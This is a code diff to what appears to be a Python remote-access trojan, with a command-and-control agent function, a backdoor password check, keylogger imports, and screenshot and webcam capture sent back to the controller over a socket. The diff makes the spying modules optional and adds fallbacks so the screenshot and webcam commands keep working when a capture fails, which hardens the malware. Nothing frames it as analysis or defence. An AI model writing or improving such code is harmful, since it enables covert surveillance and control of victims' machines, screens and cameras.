@@ -10,9 +10,18 @@ import platform
 import shutil
 import sys
 from cryptography.fernet import Fernet
-from pynput import keyboard
-from PIL import ImageGrab
-import cv2
+try:
+    from pynput import keyboard
+except ImportError:
+    keyboard = None
+try:
+    import cv2
+except ImportError:
+    cv2 = None
+try:
+    from PIL import ImageGrab
+except ImportError:
+    ImageGrab = None
 import requests
 import os
 import socketio
@@ -47,12 +56,16 @@ def start_aether_agent(c2_server_url):
 
 
 def capture_screenshot():
+    if not ImageGrab:
+        return None
     img = ImageGrab.grab()
     buf = io.BytesIO()
     img.save(buf, format='PNG')
     return buf.getvalue()
 
 def capture_webcam_image():
+    if not cv2:
+        return None
     cap = cv2.VideoCapture(0)
     ret, frame = cap.read()
     cap.release()
@@ -81,8 +94,11 @@ def handle_client(client_socket, backdoor_password):
                 break
             elif command == "screenshot":
                 img_data = capture_screenshot()
-                client_socket.send(len(img_data).to_bytes(4, 'big'))
-                client_socket.send(img_data)
+                if img_data:
+                    client_socket.send(len(img_data).to_bytes(4, 'big'))
+                    client_socket.send(img_data)
+                else:
+                    client_socket.send(b"0")
             elif command == "webcam_snap":
                 img_data = capture_webcam_image()
                 if img_data:
